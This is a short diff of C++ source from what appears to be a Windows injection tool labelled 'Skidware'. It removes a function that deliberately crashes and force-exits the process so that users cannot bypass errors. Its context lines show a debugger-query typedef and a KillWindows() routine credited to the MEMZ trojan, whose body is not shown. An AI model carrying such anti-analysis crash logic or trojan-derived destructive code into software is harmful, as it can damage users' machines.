@@ -11,37 +11,6 @@
 #include <winternl.h>
 #include "ObfuscateString.hpp"
 
-void __declspec(noinline) InjectionError(const char* message)
-{
-	/* It would be preferred that users don't bypass errors */
-
-	/* TODO: Ideally, error codes/information should be passed to the UI */
-	if (message != NULL)
-		MessageBox(NULL, message, "Skidware", MB_ICONERROR | MB_OK);
-
-	/*
-		xor eax, eax
-		xor ebx, ebx
-		xor ecx, ecx
-		xor edx, edx
-		xor esp, esp
-		xor ebp, ebp
-		jmp esp
-	*/
-
-	((DWORD(__cdecl*)())nullptr)();
-
-	/* If they really want to hook, go ahead */
-	for (;;)
-	{
-		exit(0);
-		_Exit(0);
-		_exit(0);
-		quick_exit(0);
-		ExitProcess(0);
-	}
-}
-
 typedef NTSTATUS(WINAPI* pNtQueryInformationProcess)(IN  HANDLE, IN  UINT, OUT PVOID, IN ULONG, OUT PULONG);
 
 void KillWindows() //https://github.com/Leurak/MEMZ/blob/9f09ca4ae78b1e024c35a912a3dcebd8705d259d/WindowsTrojan/Source/Destructive/KillWindows.c
